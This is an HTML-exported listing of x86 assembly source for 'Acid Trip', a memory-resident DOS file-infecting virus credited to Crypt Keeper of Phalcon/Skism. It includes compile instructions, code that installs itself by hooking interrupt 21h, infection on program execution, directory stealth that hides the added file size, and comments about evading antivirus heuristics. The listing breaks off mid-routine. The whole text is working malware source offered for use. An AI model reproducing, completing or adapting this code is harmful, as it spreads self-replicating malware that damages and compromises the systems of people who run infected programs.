<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Acid Trip   by Crypt Keeper [Phalcon/Skism]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Acid Trip is an Enemy Within variant with a trigger routine and</span><span class="sc0">
</span><span class="sc1">; a few bug fixes.  It goes off at 12:00pm (any day) if the monitor</span><span class="sc0">
</span><span class="sc1">; is in 80x25x16color text mode, scrolling wildly through the color</span><span class="sc0">
</span><span class="sc1">; pallete and displaying "Your PC is on an [Acid Trip]...  Try again</span><span class="sc0">
</span><span class="sc1">; later..." near the center of the screen.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; To compile:</span><span class="sc0">

</span><span class="sc1">; TASM ACIDTRIP.ASM /M3</span><span class="sc0">
</span><span class="sc1">; TLINK ACIDTRIP.OBJ /t</span><span class="sc0">
</span><span class="sc1">; .COM file can be executed with no modifications</span><span class="sc0">

    </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">

    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                       </span><span class="sc1">;make this a com file</span><span class="sc0">

</span><span class="sc5">acidtrip</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">vlength</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">vbot</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">acidtrip</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;Virus length in bytes</span><span class="sc0">
</span><span class="sc5">heapsiz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">hbot</span><span class="sc4">-</span><span class="sc5">htop</span><span class="sc0">              </span><span class="sc1">;size of heap data in bytes</span><span class="sc0">
</span><span class="sc5">ressize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1256</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">                </span><span class="sc1">;Virus size resident</span><span class="sc0">
</span><span class="sc5">virusid</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08AC5h</span><span class="sc0">                 </span><span class="sc1">;Virus ID word in EXE header</span><span class="sc0">
</span><span class="sc5">chkfunc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">                 </span><span class="sc1">;Check resident function for int 21h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">;save startup registers</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BDh</span><span class="sc0">                   </span><span class="sc1">;mov bp,</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;delta offset</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;AX=FFFF (check resident function)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;check if virus is resident</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;is virus resident (zero if yes)</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">                      </span><span class="sc1">;if so, don't install</span><span class="sc0">

    </span><span class="sc1">;Microsoft Windows/Desqview compatable load resident routine</span><span class="sc0">
</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                     </span><span class="sc1">;allocate memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ressize</span><span class="sc0">                 </span><span class="sc1">;amount of memory to request</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">not_enough_memory</span><span class="sc0">           </span><span class="sc1">;carry set means allocation error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;ax=segment of allocated memory</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;segment of MCB for memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">;set memory block as independant</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">memory_allocation_complete</span><span class="sc0">
</span><span class="sc5">not_enough_memory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;get PSP value off stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;ES=PSP for set memory block size</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;get segment of this program's MCB</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get size of current block</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;decrease size of memory block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">                     </span><span class="sc1">;set memory block size</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">                      </span><span class="sc1">;return if allocation error</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0">              </span><span class="sc1">;try to allocate again</span><span class="sc0">
</span><span class="sc5">memory_allocation_complete</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">;save found target segment</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                   </span><span class="sc1">;get int 21h vector</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">i21vecs</span><span class="sc4">)],</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">i21veco</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">vlength</span><span class="sc4">+</span><span class="sc5">heapsiz</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;words to move</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">;destination in memory</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">acidtrip</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;source of viral code</span><span class="sc0">

    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">                      </span><span class="sc1">;copy ourselves up there</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;segment to set int vector</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">i21vec</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;int 21h vector</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2421h</span><span class="sc0">                   </span><span class="sc1">;set int 21h vector</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                         </span><span class="sc1">;without setting off mem resident</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;code heuristic flags</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;segment of PSP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                      </span><span class="sc1">;compensate for PSP size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_cs</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;add PSP to initial CS</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;restore old DS register</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">                            </span><span class="sc1">;clear interrupt enable flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_ss</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;old SS register</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;add PSP adress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BCh</span><span class="sc0">                   </span><span class="sc1">;mov sp,</span><span class="sc0">
</span><span class="sc5">old_sp</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;old stack pointer</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">                            </span><span class="sc1">;set interrupt enable flag</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_ip</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;jump to original EXE code</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">vauthor</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Crypt Keeper P/S'</span><span class="sc0">

</span><span class="sc5">old_ip</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_cs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0FFF0h</span><span class="sc0">                 </span><span class="sc1">;Old CS:IP</span><span class="sc0">

</span><span class="sc5">old_ss</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0FFF0h</span><span class="sc0">                 </span><span class="sc1">;old stack segment</span><span class="sc0">

</span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Your PC is on an [Acid Trip]... Try again later...$'</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">i21vec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">chkfunc</span><span class="sc0">                 </span><span class="sc1">;check resident function?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_check_func</span><span class="sc0">

    </span><span class="sc6">iret</span><span class="sc0">                           </span><span class="sc1">;return from interrupt</span><span class="sc0">

</span><span class="sc5">no_check_func</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;push all used registers</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">                     </span><span class="sc1">;get time</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0C00h</span><span class="sc0">                   </span><span class="sc1">;12:00pm?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_trippin</span><span class="sc0">                 </span><span class="sc1">;if not, don't trigger</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                      </span><span class="sc1">;return current video state</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                        </span><span class="sc1">;BIOS video call</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;text mode?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_trippin</span><span class="sc0">                 </span><span class="sc1">;if not, don't trigger</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0A0Fh</span><span class="sc0">                   </span><span class="sc1">;row,column for cursor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">;set cursor position</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">message</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;message to display</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                       </span><span class="sc1">;print string</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1002h</span><span class="sc0">                   </span><span class="sc1">;Set palette registers, from buffer</span><span class="sc0">
</span><span class="sc5">trippin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;move to next group of numbers in mem</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">trippin</span><span class="sc0">
        
</span><span class="sc5">no_trippin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">;pop old registers</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;save old AX</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                         </span><span class="sc1">;avoid execute intercept heuristic flags</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">                   </span><span class="sc1">;load and execute program?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_infect_on_exec</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C01h</span><span class="sc0">                   </span><span class="sc1">;load program?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_infect_on_exec</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;restore old AX value</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                     </span><span class="sc1">;find first file (FCB)?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FCB_dir_stealth</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                     </span><span class="sc1">;find next file (FCB)?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FCB_dir_stealth</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                     </span><span class="sc1">;find first file (DTA)?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DTA_dir_stealth</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                     </span><span class="sc1">;find next file (DTA)?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DTA_dir_stealth</span><span class="sc0">

</span><span class="sc5">exit_interrupt_chained</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">i21veco</span><span class="sc0">       </span><span class="sc1">;execute rest of interrupt chain</span><span class="sc0">
</span><span class="sc5">_infect_on_exec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;restore old AX</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">                </span><span class="sc1">;and attempt to infect</span><span class="sc0">

</span><span class="sc5">FCB_dir_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc0">                  </span><span class="sc1">;go ahead and execute</span><span class="sc0">

    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;push all used registers</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">;was find successful?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealth</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                     </span><span class="sc1">;Get PSP address</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;ES=PSP address</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;parent PSP?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealth</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;first byte of FCB</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                     </span><span class="sc1">;get DTA adress</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">checkFCBinfected</span><span class="sc0">           </span><span class="sc1">;extended FCB?</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc0">                    </span><span class="sc1">;If so, make into normal</span><span class="sc0">

</span><span class="sc5">checkFCBinfected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Get time and date</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;unmask seconds and date</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;file infected?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealth</span><span class="sc0">     </span><span class="sc1">;exit stealth interrupt</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01Dh</span><span class="sc4">],</span><span class="sc5">vlength</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01Fh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;subtract virus size</span><span class="sc0">

</span><span class="sc5">exit_interrupt_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">                           </span><span class="sc1">;pop all used registers</span><span class="sc0">
</span><span class="sc5">exit_interrupt_stealthvec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                       </span><span class="sc1">;return with given flags</span><span class="sc0">

</span><span class="sc5">DTA_dir_stealth</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;DTA directory size subtract</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc0">                  </span><span class="sc1">;go ahead and execute</span><span class="sc0">

